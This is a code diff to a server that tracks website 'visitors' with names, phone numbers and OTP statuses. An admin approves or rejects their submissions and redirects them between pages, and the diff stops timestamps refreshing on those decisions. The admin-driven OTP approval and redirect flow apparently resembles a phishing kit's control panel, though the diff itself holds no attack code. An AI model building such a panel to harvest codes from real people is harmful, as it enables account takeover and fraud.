@@ -859,13 +859,18 @@ async function startServer() {
       };
 
       const timestampField = timestampFieldMap[field] || 'updatedAt';
-      const now = new Date().toISOString();
-
-      // Build update data with timestamp
+      
+      // Build update data - ONLY add timestamp for DATA submissions (pending), not for decisions (approved/rejected)
+      // This prevents the time from being refreshed when admin clicks buttons
+      const isDecision = status === 'approved' || status === 'rejected';
       const updateData: Record<string, any> = {
         [field]: status,
-        [timestampField]: now,
       };
+      // Only update timestamp when submitting NEW data (pending), NOT when making decisions
+      if (!isDecision) {
+        updateData[timestampField] = new Date().toISOString();
+      }
+      // For decisions, keep the existing timestamp so buttons stay hidden
 
       // Update visitor in database
       await upsertVisitor(visitorId, updateData);
@@ -1703,10 +1708,8 @@ async function startServer() {
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
       const now = new Date().toISOString();
 
-      // Use client-provided timestamp field, or fallback to page-based mapping
-      // This ensures the timestamp corresponds to the BOX being acted on, not the target page
-      const timestampField = clientTimestampField || 'updatedAt';
-      console.log("[Dashboard Redirect] Using timestampField:", timestampField);
+      // DO NOT update timestamps on redirect - this preserves button hiding state
+      // Only update redirect-related fields
 
       // Clear ALL previous statuses and set one-time redirect
       const updateData: Record<string, any> = {
@@ -1714,8 +1717,6 @@ async function startServer() {
         adminRedirectAt: now,
         oneTimeRedirect: targetPage, // One-time redirect flag
         currentPage: targetPage,
-        // Only update the timestamp field that was explicitly provided
-        ...(timestampField !== 'updatedAt' && { [timestampField]: now }),
         // Clear all previous statuses
         phoneOtpStatus: null,
         phoneRejectionMessage: null,
